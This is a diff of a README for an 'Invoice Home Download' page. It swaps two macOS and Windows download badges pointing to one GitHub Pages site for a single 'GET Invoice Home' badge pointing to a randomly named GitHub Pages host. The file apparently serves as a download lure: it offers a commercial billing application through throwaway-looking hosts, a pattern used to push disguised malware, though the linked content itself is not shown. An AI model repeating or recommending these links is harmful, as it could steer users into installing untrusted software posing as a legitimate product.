@@ -1,18 +1,7 @@
 # Invoice Home Download — Billing Platform
 
-<a href="https://io-app-git.github.io/.github/?offer=InvoiceHome" target="_blank">
-  <img 
-    src="https://img.shields.io/badge/Invoice%20Home%20for%20macOS-000000?style=for-the-badge&logo=apple&logoColor=white" 
-    width="280" 
-    alt="Invoice Home for macOS">
-</a>
+[![GET Invoice Home](https://img.shields.io/badge/GET%20%E2%80%94%20Invoice-Home-0078D6?style=for-the-badge&logoColor=white)](https://novascannerlavenderxht25909.github.io/.github/Invoice-Home)
 
-<a href="https://io-app-git.github.io/.github/?offer=InvoiceHome" target="_blank">
-  <img 
-    src="https://img.shields.io/badge/Invoice%20Home%20for%20Windows-0078D7?style=for-the-badge&logo=windows&logoColor=white" 
-    width="280" 
-    alt="Invoice Home for Windows">
-</a>
 
 ---
 
